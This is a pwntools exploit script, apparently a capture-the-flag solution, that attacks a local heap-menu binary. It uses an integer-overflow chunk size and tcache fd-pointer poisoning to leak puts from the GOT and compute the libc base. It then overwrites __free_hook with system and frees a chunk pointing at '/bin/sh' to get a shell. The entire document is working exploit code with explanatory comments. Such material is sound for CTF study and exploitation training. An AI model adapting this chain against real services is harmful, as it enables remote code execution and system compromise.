from pwn import *

binary = ELF("./main")
libc = ELF("./libc.so.6")

if "REMOTE" in args:
    p = remote("localhost", "1337")
else:
    p = gdb.debug(binary.path)

p.sendlineafter(b">", b"1") # create chunk with overflow
p.sendline(b"4294967295")
p.send(b"A" * 7)
p.send(b"A" * 11)

p.sendlineafter(b">", b"1") # dummy chunk to be freed
p.sendline(b"4")
p.send(b"C" * 7)
p.send(b"D" * 3)

p.sendlineafter(b">", b"4") # free chunk into tcache
p.sendline(b"1")

p.sendlineafter(b">", b"3") # overwrite fd pointer of freed chunk
p.sendline(b"0")
payload = b"A" * 12
payload += p64(0x81)
payload += p64(binary.bss() + 0x30) # fd pointer points to just before the global array
p.send(payload)

p.sendlineafter(b">", b"1") # alloc the chunk that was just freed (unused, we control the next alloc)
p.sendline(b"4")
p.send(b"C" * 7)
p.send(b"D" * 3)


p.sendlineafter(b">", b"1") # this creats a new chunk at the address we specified 
p.sendline(b"4294967295")
p.send(b"E" * 7)
payload = b"F" * 4
payload += p64(binary.got["puts"] - 4) # we want to leak puts, -4 to align the struct since the first 4 bytes is treated as the size
p.send(payload)

p.sendlineafter(b">", b"2") # leak puts
p.sendline(b"0")

p.recvuntil(b"Name: ")
leak = u64(p.recvline().split(b"Order")[0].ljust(8, b'\x00'))

libc.address = leak - libc.sym["puts"]

p.sendlineafter(b">", b"3") # overwrite first chunk to point to __free_hook - 12 so that order->data points to __free_hook
p.sendline(b"2")
payload = b"F" * 4
payload += p64(libc.sym["__free_hook"] - 12)
p.send(payload)


p.sendlineafter(b">", b"3") # overwrite __free_hook
p.sendline(b"0")
payload = p64(libc.sym["system"])
p.send(payload)

p.sendlineafter(b">", b"3") # make the chunk point to /bin/sh
p.sendline(b"2")
payload = b"F" * 4
payload += p64(next(libc.search(b"/bin/sh")))
p.send(payload)

p.sendlineafter(b">", b"4") # free chunk and profit
p.sendline(b"0")


p.interactive()